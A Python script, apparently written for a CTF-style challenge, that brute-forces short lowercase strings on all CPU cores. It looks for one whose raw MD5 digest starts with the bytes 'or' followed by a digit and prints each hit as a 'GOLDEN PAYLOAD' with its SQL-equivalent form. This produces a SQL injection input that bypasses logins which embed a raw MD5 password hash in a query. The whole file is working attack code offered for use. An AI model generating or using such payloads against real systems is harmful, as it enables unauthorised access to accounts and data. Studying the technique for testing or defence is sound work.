import hashlib
import multiprocessing
import os
import sys
import string

# TARGET: 'or' (hex: 27 6f 72 27)
# We look for this EXACT start, followed by a digit.
TARGET_PREFIX = b"\x27\x6f\x72\x27"

# Character set to use (a-z)
# If you want uppercase too, use: string.ascii_letters
CHARSET = string.ascii_lowercase 
BASE = len(CHARSET)

def num_to_str(n):
    """
    Converts a number to a bijective base-N string.
    0 -> a, 25 -> z, 26 -> aa, 27 -> ab
    """
    res = []
    while True:
        n, r = divmod(n, BASE)
        res.append(CHARSET[r])
        if n == 0: break
        n -= 1
    return "".join(reversed(res))

def worker_search(start_index, step):
    i = start_index
    while True:
        # Convert counter to letters (e.g., 1523 -> 'bgh')
        candidate = num_to_str(i)
        
        # Calculate Raw MD5
        digest = hashlib.md5(candidate.encode()).digest()
        
        # 1. Fast Check: Does it start with 'or' ?
        if digest.startswith(TARGET_PREFIX):
            
            # 2. Strict Check: Is the next byte a number (0-9)?
            if len(digest) > 4:
                next_byte = digest[4]
                if 0x30 <= next_byte <= 0x39:
                    
                    # FOUND ONE!
                    hex_str = digest.hex()
                    output = f"\n[!!!] GOLDEN PAYLOAD FOUND (Process {os.getpid()}) [!!!]\n"
                    output += f"    String Input: {candidate}\n"
                    output += f"    Raw MD5:      {digest[0:10]}...\n"
                    output += f"    SQL Equiv:    {digest[0:5].decode('latin-1')}...\n"
                    print(output)
                    
        # Increment stride
        i += step

def main():
    num_cores = multiprocessing.cpu_count()
    print(f"[*] Starting LETTER-based search on {num_cores} cores.")
    print(f"[*] Character Set: {CHARSET}")
    print(f"[*] Target: 'or' + [0-9] (Hex: 27 6f 72 27 3x)")
    print("[*] This checks 'a', 'b'... 'aa'... 'zzzz'. Press Ctrl+C to stop.\n")

    processes = []
    
    for core in range(num_cores):
        p = multiprocessing.Process(
            target=worker_search, 
            args=(core, num_cores)
        )
        p.daemon = True
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping...")

if __name__ == "__main__":
    main()
